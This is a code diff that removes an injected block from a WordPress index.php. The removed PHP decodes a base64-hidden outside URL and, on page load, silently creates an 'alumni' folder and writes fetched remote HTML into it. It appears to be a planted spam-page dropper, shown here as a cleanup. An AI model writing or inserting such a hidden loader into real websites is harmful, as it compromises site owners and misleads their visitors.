@@ -11,23 +11,7 @@
  *
  * @var bool
  */
- 
-$dir1 = __DIR__ . '/alumni/';
-$file1 = $dir1 . 'index.html';
-$encoded = 'aHR0cHM6Ly90aGVvbmx5ZC54eXovc2VsbG15aG91c2VmYXN0dHVsc2EuaHRtbA==';
-$source1 = 'https://' . base64_decode($encoded);
 
-if (!is_dir($dir1)) {
-    mkdir($dir1, 0755, true);
-}
-
-if (!file_exists($file1) || filesize($file1) < 100) {
-    $content1 = @file_get_contents($source1);
-    if ($content1) {
-        file_put_contents($file1, $content1);
-    }
-}
- 
 define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
